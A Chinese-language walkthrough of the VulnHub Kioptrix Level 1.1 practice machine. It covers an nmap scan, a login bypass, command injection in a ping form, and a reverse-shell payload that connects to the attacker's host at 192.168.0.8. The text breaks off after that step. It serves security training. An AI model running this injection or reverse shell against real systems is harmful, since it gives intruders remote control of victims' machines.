# Kioptrix: Level 1.1

下载地址：

```
https://download.vulnhub.com/kioptrix/Kioptrix_Level_2-update.rar
```

## 实战操作

netdiscover找到靶场IP：`192.168.0.10`

```
┌──(root💀kali)-[/tmp]
└─# nmap -sV -p1-65535 192.168.0.10                                                                            255 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-11 23:22 EST
Nmap scan report for 192.168.0.10
Host is up (0.0012s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind    2 (RPC #100000)
443/tcp  open  ssl/https?
615/tcp  open  status     1 (RPC #100024)
631/tcp  open  ipp        CUPS 1.1
3306/tcp open  mysql      MySQL (unauthorized)
MAC Address: 00:0C:29:C9:8D:0E (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.56 seconds
                                                                
```

### HTTP

浏览器访问80端口，看到一个登录界面。

![](<../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

用万能密码登录进去

![](<../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

登录进去之后，发现是一个ping IP功能，看到这个就可以知道有命令注入漏洞。

![](<../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1) (1).png>)

回显权限是apache

![](<../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png>)

配置反弹shell，payload：`0 | bash -i >& /dev/tcp/192.168.0.8/7777 0>&1`

![](<../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

